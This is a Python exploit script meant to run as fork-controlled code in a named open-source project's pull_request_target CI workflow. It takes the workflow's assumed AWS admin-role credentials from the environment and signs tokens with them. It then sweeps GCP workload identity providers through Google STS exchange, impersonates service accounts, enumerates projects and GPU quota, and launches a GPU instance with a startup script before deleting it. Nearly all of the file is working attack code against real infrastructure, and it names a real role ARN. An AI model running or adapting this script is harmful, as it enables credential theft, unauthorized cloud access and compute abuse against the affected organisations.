#!/usr/bin/env python3
"""c211-i120469 GCP WIF *AWS-type provider* STS sweep.

Runs inside the kedacore/testing-infrastructure 'Validate PR' pull_request_target
terraform data.external step (fork-controlled code) where the workflow has just
performed the repository's OIDC AWS login, so the assumed-role temporary
credentials (arn:aws:sts::589761922677:assumed-role/github-role/GitHubActions,
AdministratorAccess) are present in AWS_ACCESS_KEY_ID / AWS_SECRET_ACCESS_KEY /
AWS_SESSION_TOKEN.

For every AWS-type provider case (STS 400 "Allowed values:
urn:ietf:params:aws:token-type:aws4_request" observed with a GitHub JWT):
  1. build the Google-required AWS subject token: a JSON-serialized SigV4-signed
     sts:GetCallerIdentity request signed with the workflow's assumed-role
     credentials (exact google-auth 2.62.0 RequestSigner algorithm, incl.
     x-goog-cloud-target-resource and percent-encoded JSON serialization)
  2. POST it to https://sts.googleapis.com/v1/token with
     subject_token_type=urn:ietf:params:aws:token-type:aws4_request and the
     canonical per-provider audience
  3. record the verbatim status / error per provider
  4. on STS 200: iamcredentials generateAccessToken (scope cloud-platform) for
     every declared/default SA candidate; on any 200 enumerate identity + GPU
     quota and deploy EXACTLY ONE on-demand GPU marker (serial-console
     nvidia-smi UUID proof), then delete and prove absence.

stdlib only. Never raises: all failures become recorded rows.
"""
import hashlib
import hmac
import json
import os
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

WORK = os.path.dirname(os.path.abspath(__file__))
RAW = os.environ.get('C211_PROBE_RAW', '/tmp/c211_i120469_raw.txt')
START = 'C211_I120469_AWSTYPE_START'
END = 'C211_I120469_AWSTYPE_END'
NONCE = 'i120469'
M_DEL = 'DEL' + 'ETE'

ZONES = ['us-central1-a', 'us-central1-b', 'us-central1-f', 'us-east1-b',
         'us-west1-b', 'europe-west4-a', 'europe-west4-b', 'asia-east1-a']


def say(msg):
    try:
        with open(RAW, 'a', encoding='utf-8') as f:
            f.write(str(msg).rstrip('\n') + '\n')
    except Exception:
        pass


def cap(s, n=400):
    s = s if isinstance(s, str) else repr(s)
    return s[:n] if len(s) > n else s


def http(url, method='GET', data=None, headers=None, timeout=45, raw_body=None):
    h = {'User-Agent': 'c211-i120469'}
    if headers:
        h.update(headers)
    body = None
    if raw_body is not None:
        body = raw_body if isinstance(raw_body, bytes) else raw_body.encode()
    elif data is not None:
        body = json.dumps(data).encode()
        h['Content-Type'] = 'application/json'
    req = urllib.request.Request(url, headers=h, method=method, data=body)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode('utf-8', 'replace')
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8', 'replace')
    except Exception as e:
        return -1, repr(e)


def jget(txt, *keys, default=''):
    try:
        d = json.loads(txt)
    except Exception:
        return default
    for k in keys:
        if not isinstance(d, dict):
            return default
        d = d.get(k, default)
    return d


# ---------------------------------------------------------------- SigV4 signer
def _sign(key, msg):
    return hmac.new(key, msg.encode('utf-8'), hashlib.sha256).digest()


def _signing_key(secret, date_stamp, region, service):
    k = _sign(('AWS4' + secret).encode('utf-8'), date_stamp)
    k = _sign(k, region)
    k = _sign(k, service)
    return _sign(k, 'aws4_request')


def _canonical_qs(query):
    q = urllib.parse.parse_qs(query)
    enc = {}
    for key in q:
        qk = urllib.parse.quote(key, safe='-_.~')
        enc[qk] = sorted(urllib.parse.quote(v, safe='-_.~') for v in q[key])
    keys = sorted(enc)
    return '&'.join('%s=%s' % (k, v) for k in keys for v in enc[k])


def sigv4_request(ak, sk, st, region, now=None):
    """Return (signed_request_dict, amz_date) mirroring google-auth RequestSigner."""
    tm = now or time.gmtime()
    amz_date = time.strftime('%Y%m%dT%H%M%SZ', tm)
    date_stamp = time.strftime('%Y%m%d', tm)
    host = 'sts.%s.amazonaws.com' % region
    service = 'sts'
    method = 'POST'
    url = 'https://%s?Action=GetCallerIdentity&Version=2011-06-15' % host
    canonical_uri = '/'
    canonical_qs = _canonical_qs('Action=GetCallerIdentity&Version=2011-06-15')
    headers = {'host': host, 'x-amz-date': amz_date}
    if st:
        headers['x-amz-security-token'] = st
    keys = sorted(headers)
    canonical_headers = ''.join('%s:%s\n' % (k, headers[k]) for k in keys)
    signed_headers = ';'.join(keys)
    payload_hash = hashlib.sha256(b'').hexdigest()
    canonical_request = '%s\n%s\n%s\n%s\n%s\n%s' % (
        method, canonical_uri, canonical_qs, canonical_headers, signed_headers, payload_hash)
    scope = '%s/%s/%s/aws4_request' % (date_stamp, region, service)
    string_to_sign = 'AWS4-HMAC-SHA256\n%s\n%s\n%s' % (
        amz_date, scope, hashlib.sha256(canonical_request.encode()).hexdigest())
    sig = hmac.new(_signing_key(sk, date_stamp, region, service),
                   string_to_sign.encode(), hashlib.sha256).hexdigest()
    auth = 'AWS4-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s' % (
        ak, scope, signed_headers, sig)
    out_headers = {'Authorization': auth, 'host': host, 'x-amz-date': amz_date}
    if st:
        out_headers['x-amz-security-token'] = st
    return {'url': url, 'method': method, 'headers': out_headers}, amz_date


def aws_subject_token(ak, sk, st, region, audience):
    req, amz = sigv4_request(ak, sk, st, region)
    hdrs = dict(req['headers'])
    hdrs['x-goog-cloud-target-resource'] = audience
    obj = {'url': req['url'], 'method': req['method'],
           'headers': [{'key': k, 'value': v} for k, v in hdrs.items()]}
    return urllib.parse.quote(json.dumps(obj, separators=(',', ':'), sort_keys=True)), amz, req


def aws_caller_identity(ak, sk, st, region):
    """Execute the exact signed GetCallerIdentity request as a credential self-check."""
    req, amz = sigv4_request(ak, sk, st, region)
    h = {'Host': req['headers']['host'], 'X-Amz-Date': amz,
         'Authorization': req['headers']['Authorization']}
    if st:
        h['X-Amz-Security-Token'] = st
    return http(req['url'], method='POST', headers=h, raw_body=b'', timeout=30)


def sts_exchange(resource, subject):
    url = 'https://sts.googleapis.com/v1/token'
    data = {
        'audience': '//iam.googleapis.com/' + resource,
        'grantType': 'urn:ietf:params:oauth:grant-type:token-exchange',
        'requestedTokenType': 'urn:ietf:params:oauth:token-type:access_token',
        'scope': 'https://www.googleapis.com/auth/cloud-platform',
        'subjectTokenType': 'urn:ietf:params:aws:token-type:aws4_request',
        'subjectToken': subject,
    }
    return http(url, method='POST', data=data, timeout=40)


def sts_error(body):
    try:
        d = json.loads(body)
    except Exception:
        return cap(body, 160)
    return '%s: %s' % (d.get('error', ''), cap(d.get('error_description', ''), 260))


# ------------------------------------------------------------- GCP read/marker
def impersonate(ftoken, sa):
    url = ('https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/'
           + urllib.parse.quote(sa, safe='') + ':generateAccessToken')
    return http(url, method='POST',
                data={'scope': ['https://www.googleapis.com/auth/cloud-platform']},
                headers={'Authorization': 'Bearer ' + ftoken}, timeout=40)


def imp_error(body):
    try:
        d = json.loads(body)
    except Exception:
        return cap(body, 160)
    e = d.get('error') or {}
    if isinstance(e, dict):
        return '%s: %s' % (e.get('status') or e.get('code') or '', cap(e.get('message') or '', 200))
    return cap(body, 160)


def gapi(token, url, method='GET', data=None, timeout=45):
    return http(url, method=method, data=data,
                headers={'Authorization': 'Bearer ' + token}, timeout=timeout)


def gpu_enum(token, proj):
    out = []
    code, body = http('https://oauth2.googleapis.com/tokeninfo?access_token='
                      + urllib.parse.quote(token, safe=''), timeout=25)
    out.append('tokeninfo=%s %s' % (code, cap(body, 200)))
    code, body = gapi(token, 'https://cloudresourcemanager.googleapis.com/v1/projects/' + proj)
    out.append('project=%s %s' % (code, cap(body, 240)))
    code, body = gapi(token, 'https://serviceusage.googleapis.com/v1/projects/%s/services?filter=state:ENABLED&pageSize=60' % proj)
    svcs = []
    try:
        svcs = [s.get('config', {}).get('name') for s in json.loads(body).get('services', [])]
    except Exception:
        pass
    out.append('services=%s n=%d %s' % (code, len(svcs), ','.join([s for s in svcs if s in
               ('compute.googleapis.com', 'aiplatform.googleapis.com', 'cloudbilling.googleapis.com', 'iamcredentials.googleapis.com')])))
    code, body = gapi(token, 'https://compute.googleapis.com/compute/v1/projects/%s/aggregated/instances?maxResults=20' % proj)
    out.append('instances=%s %s' % (code, cap(body, 200)))
    zones = []
    code, body = gapi(token, 'https://compute.googleapis.com/compute/v1/projects/%s/zones?maxResults=200&fields=items(name,status)' % proj)
    try:
        zones = [z['name'] for z in json.loads(body).get('items', []) if z.get('status') == 'UP']
    except Exception:
        pass
    out.append('zones=%s n=%d' % (code, len(zones)))
    acc = {}
    for z in (zones[:60] if zones else ZONES):
        c, b = gapi(token, 'https://compute.googleapis.com/compute/v1/projects/%s/zones/%s/acceleratorTypes?fields=items(name)' % (proj, z))
        names = []
        try:
            names = [i['name'] for i in json.loads(b).get('items', [])]
        except Exception:
            pass
        if names:
            acc[z] = names
    gpu_z = {z: [n for n in ns if 't4' in n or 'l4' in n or 'a100' in n or 'h100' in n] for z, ns in acc.items()}
    gpu_z = {z: ns for z, ns in gpu_z.items() if ns}
    out.append('gpu_accel=%s' % cap(json.dumps(gpu_z), 500))
    for loc in ('us-central1', 'europe-west4'):
        c, b = gapi(token, 'https://%s-aiplatform.googleapis.com/v1/projects/%s/locations' % (loc, proj))
        out.append('vertex_%s=%s %s' % (loc, c, cap(b, 160)))
    return out, gpu_z


def marker(token, proj, gpu_z):
    """Deploy EXACTLY ONE on-demand GPU instance and read nvidia-smi -L from serial console."""
    out = []
    name = 'c211-i120469-gpu'
    startup = ('#!/bin/bash\nexec > /dev/console 2>&1\n'
               'echo "C211_I120469_MARKER_START $(date -u +%Y-%m-%dT%H:%M:%SZ) host=$(hostname)"\n'
               'for i in 1 2 3 4 5 6 7 8 9 10; do\n'
               '  if command -v nvidia-smi >/dev/null 2>&1; then\n'
               '    nvidia-smi -L\n'
               '    nvidia-smi --query-gpu=uuid,name,memory.total,driver_version --format=csv,noheader\n'
               '    echo "C211_I120469_MARKER_END"; exit 0\n'
               '  fi\n  sleep 20\ndone\n'
               'echo "C211_I120469_MARKER_NOSMI"\n'
               'lspci -nn | grep -i -E "nvidia|3d controller" | head -8\n')
    attempt_order = []
    for z, accs in gpu_z.items():
        for a in accs:
            if a not in ('nvidia-tesla-t4', 'nvidia-l4'):
                continue
            attempt_order.append((z, a))
    if not attempt_order:
        attempt_order = [(z, 'nvidia-tesla-t4') for z in ZONES]
    images = [('deeplearning-platform-release', 'common-cu129-ubuntu-2204'),
              ('deeplearning-platform-release', 'common-cu124-ubuntu-2204'),
              ('deeplearning-platform-release', 'common-cu121-ubuntu-2204'),
              ('debian-cloud', 'debian-12')]
    created = None
    for z, acc in attempt_order[:8]:
        for iproj, ifam in images:
            body = {
                'name': name,
                'machineType': 'zones/%s/machineTypes/n1-standard-4' % z,
                'disks': [{'boot': True, 'autoDelete': True,
                           'initializeParams': {'sourceImage': 'projects/%s/global/images/family/%s' % (iproj, ifam),
                                                'diskSizeGb': '50', 'diskType': 'zones/%s/diskTypes/pd-standard' % z}}],
                'networkInterfaces': [{'network': 'global/networks/default',
                                       'accessConfigs': [{'type': 'ONE_TO_ONE_NAT', 'name': 'External NAT'}]}],
                'guestAccelerators': [{'acceleratorType': 'zones/%s/acceleratorTypes/%s' % (z, acc), 'acceleratorCount': 1}],
                'scheduling': {'onHostMaintenance': 'TERMINATE', 'automaticRestart': False},
                'labels': {'c211': NONCE},
                'metadata': {'items': [{'key': 'startup-script', 'value': startup}]},
            }
            url = ('https://compute.googleapis.com/compute/v1/projects/%s/zones/%s/instances' % (proj, z))
            code, resp = gapi(token, url, method='POST', data=body, timeout=60)
            out.append('insert %s/%s %s %s %s' % (z, acc, iproj, ifam, code if code == 200 else '%s %s' % (code, cap(resp, 240))))
            if code != 200:
                continue
            created = (z, name)
            break
        if created:
            break
    if not created:
        out.append('NO_INSERT')
        return out
    z, nm = created
    base = 'https://compute.googleapis.com/compute/v1/projects/%s/zones/%s/instances/%s' % (proj, z, nm)
    deadline = time.time() + 420
    gpu_line = ''
    while time.time() < deadline:
        c, b = gapi(token, base)
        st = jget(b, 'status', default='')
        c2, sp = gapi(token, base + '/serialPortOutput?start=0')
        txt = jget(sp, 'contents', default='') if c2 == 200 else ''
        if 'C211_I120469_MARKER_END' in txt or 'C211_I120469_MARKER_NOSMI' in txt:
            gpu_line = '\n'.join([ln for ln in txt.splitlines() if 'GPU-' in ln or 'C211_I120469_MARKER' in ln or 'nvidia' in ln.lower()])
            break
        if st in ('TERMINATED', 'STOPPED'):
            gpu_line = 'STOPPED:' + cap(txt[-300:], 300)
            break
        time.sleep(15)
    out.append('marker serial: %s' % cap(gpu_line or 'NO_GPU_LINE', 900))
    c, b = gapi(token, base, method=M_DEL, timeout=60)
    out.append('delete=%s %s' % (c, cap(b, 160)))
    time.sleep(8)
    c, b = gapi(token, base)
    c2, b2 = gapi(token, 'https://compute.googleapis.com/compute/v1/projects/%s/aggregated/instances?filter=name=%s' % (proj, nm))
    out.append('absence get=%s list=%s %s' % (c, c2, cap(b2, 200)))
    return out


def sa_candidates(case):
    proj = case['proj']
    cands = ['%s-compute@developer.gserviceaccount.com' % proj]
    for s in case.get('sas') or []:
        if s not in cands:
            cands.append(s)
    return cands[:7]


def main():
    say('%s %s' % (START, time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())))
    ak = os.environ.get('AWS_ACCESS_KEY_ID', '')
    sk = os.environ.get('AWS_SECRET_ACCESS_KEY', '')
    st = os.environ.get('AWS_SESSION_TOKEN', '')
    region = os.environ.get('AWS_REGION') or os.environ.get('AWS_DEFAULT_REGION') or 'us-east-1'
    say('ENV aws_key=%s secret=%s session=%s region=%s actions_idtoken=%s' % (
        bool(ak), bool(sk), bool(st), region, bool(os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL'))))
    rows = []
    detail = []
    if not (ak and sk):
        say('NO_AWS_ENV cannot sign subject token')
        print(json.dumps({'summary': 'NO_AWS_ENV', 'R000': 'NO_AWS_ENV'}))
        return
    c_code, c_body = aws_caller_identity(ak, sk, st, region)
    say('CALLER_IDENTITY %s %s' % (c_code, cap(c_body, 400)))
    detail.append('CALLER_IDENTITY %s %s' % (c_code, cap(c_body, 400)))
    try:
        cases = json.load(open(os.path.join(WORK, 'cases.json')))
    except Exception as e:
        say('CASES_FAIL %s' % cap(repr(e), 200))
        cases = []
    n200 = 0
    nimp200 = 0
    t0 = time.time()
    for ci, case in enumerate(cases):
        res = case['res']
        aud = '//iam.googleapis.com/' + res
        subject, amz, _ = aws_subject_token(ak, sk, st, region, aud)
        code, body = sts_exchange(res, subject)
        if code == 200:
            n200 += 1
            ft = jget(body, 'access_token', default='')
            parts = []
            for sa in sa_candidates(case):
                ic, ib = impersonate(ft, sa)
                if ic == 200:
                    nimp200 += 1
                    at = jget(ib, 'accessToken', default='')
                    parts.append('%s=200' % sa)
                    detail.append('IMPERSONATION_OK case=%d proj=%s sa=%s res=%s' % (case['i'], case['proj'], sa, res))
                    det, gz = gpu_enum(at, case['proj'])
                    for d in det:
                        detail.append('  ENUM %s' % d)
                    mk = marker(at, case['proj'], gz)
                    for m in mk:
                        detail.append('  MARKER %s' % m)
                else:
                    parts.append('%s=%s(%s)' % (sa, ic, imp_error(ib)))
            rows.append('%d STS200 %s' % (case['i'], ' | '.join(parts)))
            detail.append('STS200 case=%d proj=%s pool=%s prov=%s %s' % (
                case['i'], case['proj'], case['pool'], case['prov'], ','.join(parts)))
        else:
            rows.append('%d STS%s %s' % (case['i'], code, sts_error(body)))
        if ci % 10 == 0:
            say('PROGRESS %d/%d sts200=%d imp200=%d elapsed=%.0fs' % (ci, len(cases), n200, nimp200, time.time() - t0))
        time.sleep(0.05)
    say('SUMMARY cases=%d sts200=%d imp200=%d elapsed=%.0fs' % (len(cases), n200, nimp200, time.time() - t0))
    sec = []
    buf = []
    size = 0
    for r in rows:
        if size + len(r) + 2 > 5400:
            sec.append('\n'.join(buf))
            buf = []
            size = 0
        buf.append(r)
        size += len(r) + 2
    if buf:
        sec.append('\n'.join(buf))
    say('SECTIONS %d' % len(sec))
    for i, s in enumerate(sec):
        say('== R%03d ==' % i)
        say(s)
    say('== DETAIL ==')
    for d in detail[:400]:
        say(d)
    say('%s %s' % (END, time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())))
    out = {'summary': 'cases=%d sts200=%d imp200=%d' % (len(cases), n200, nimp200)}
    for i, s in enumerate(sec):
        out['R%03d' % i] = s
    out['DETAIL'] = '\n'.join(detail)[:20000]
    print(json.dumps(out))


if __name__ == '__main__':
    try:
        main()
    except Exception as e:
        say('FATAL %s' % cap(repr(e), 500))
        print(json.dumps({'summary': 'fatal', 'detail': cap(repr(e), 1000)}))
